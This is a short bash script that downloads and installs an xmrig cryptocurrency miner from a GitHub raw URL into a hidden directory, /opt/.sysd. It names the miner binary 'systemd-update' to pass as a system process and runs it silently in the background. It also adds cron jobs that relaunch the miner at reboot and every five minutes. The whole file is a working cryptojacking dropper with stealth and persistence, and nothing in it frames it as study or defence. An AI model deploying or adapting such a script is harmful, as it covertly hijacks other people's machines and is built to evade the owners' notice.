#!/bin/bash

DIR="/opt/.sysd"
BIN="systemd-update"
GITHUB="https://raw.githubusercontent.com/ThipyThipy/machinee/main"

mkdir -p $DIR && cd $DIR

curl -fsSL $GITHUB/xmrig.tar.gz -o miner.tar.gz
tar -xzf miner.tar.gz
chmod +x $BIN

nohup nice -n 19 ./$BIN > /dev/null 2>&1 &

(crontab -l 2>/dev/null; echo "@reboot $DIR/$BIN") | crontab -
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep -f $BIN > /dev/null || $DIR/$BIN") | crontab -
